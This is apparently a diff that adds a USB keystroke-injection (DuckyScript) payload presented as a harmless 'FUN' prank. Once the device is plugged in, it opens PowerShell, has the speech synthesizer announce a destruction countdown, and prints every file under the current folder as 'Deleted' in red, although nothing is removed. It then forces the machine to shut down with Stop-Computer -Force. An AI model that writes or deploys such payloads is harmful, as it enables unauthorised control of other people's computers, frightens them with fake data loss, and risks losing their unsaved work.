@@ -1,0 +1,23 @@
+REM Author: DS
+REM Description: Makes the computer speak in English while searching files in a separate console
+REM Version: 3.7
+REM Category: FUN
+
+DEFAULTDELAY 100
+DEFAULTSTRINGDELAY 1
+
+GUI r
+DELAY 500
+STRINGLN powershell
+DELAY 500
+
+STRINGLN Start-Job -ScriptBlock { Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.SelectVoice('Microsoft Zira Desktop'); $synth.Speak('Warning. Destruction in ten, nine, eight, seven, six, five, four, 3, 2, 1, 0ooooooooo') }
+
+
+STRINGLN Get-ChildItem -Recurse | ForEach-Object { Write-Host "Deleted: $($_.Name)" -ForegroundColor Red }
+
+
+DELAY 8000
+CONTROL c
+
+STRINGLN Stop-Computer -Force
